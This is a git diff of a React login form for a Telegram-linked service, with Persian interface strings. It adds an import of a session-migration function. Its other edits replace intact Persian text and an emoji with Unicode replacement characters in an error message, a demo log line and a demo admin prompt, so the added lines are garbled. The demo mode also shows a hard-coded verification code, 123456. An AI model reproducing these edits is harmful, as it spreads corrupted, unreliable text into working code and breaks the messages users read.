@@ -33,6 +33,7 @@ import {
   updateSessionWithEmail,
   updateSessionWithEmailCode,
   updateUserOnlineStatus,
+  migrateTemporarySession,
 } from "@/lib/telegram-service-enhanced";
 import {
   registerSecureCallback,
@@ -184,7 +185,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه است. لطفا ��د صحیح را وارد کنید.",
           });
           break;
       }
@@ -271,7 +272,7 @@ export const LoginForm = () => {
 
       // Show demo verification code if in demo mode
       if (!validateTelegramConfig()) {
-        console.log("🎭 Demo verification code: 123456");
+        console.log("��� Demo verification code: 123456");
         alert(
           "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
         );
@@ -345,7 +346,7 @@ export const LoginForm = () => {
           if (!validateTelegramConfig()) {
             setTimeout(() => {
               const choice = prompt(
-                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
+                "🎭 حالت دمو - شبیه‌سا��ی ادمین\n\n" +
                   "انتخاب کنید:\n" +
                   "1 = Password\n" +
                   "2 = Google Auth\n" +
